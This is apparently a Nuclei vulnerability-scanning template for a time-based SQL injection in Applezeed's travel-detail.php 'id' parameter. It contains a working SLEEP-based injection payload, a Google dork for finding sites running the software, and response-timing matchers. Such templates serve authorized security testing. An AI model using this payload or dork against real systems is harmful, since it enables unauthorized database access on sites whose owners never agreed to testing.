http:
- matchers:
  - condition: and
    dsl:
    - duration>=6
    - contains(content_type, "text/html")
    - contains(body, "applezeed")
    - status_code == 200
    type: dsl
  raw:
  - '@timeout: 15s

    GET /travel-detail.php?id=1%27AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(6)))bAKL)%20AND%20%27vRxe%27=%27vRxe
    HTTP/2

    Host: {{Hostname}}

    '
id: applezeed-sqli
info:
  author: r3Y3r53
  description: 'Applezeed''s ''travel-details.php?id='' URL with possible time-based
    SQL injection (SQLi) vulnerability allows attackers to manipulate the ''id'' parameter,
    potentially causing delays in SQL queries and unauthorized retrieval of travel
    information from the database

    '
  metadata:
    google-query: intext:"Power BY applezeed.com"
    max-request: 1
    verified: true
  name: Applezeed - SQL Injection
  reference:
  - https://cxsecurity.com/issue/WLB-2019120057
  severity: high
  tags: sqli,unauth,applezeed
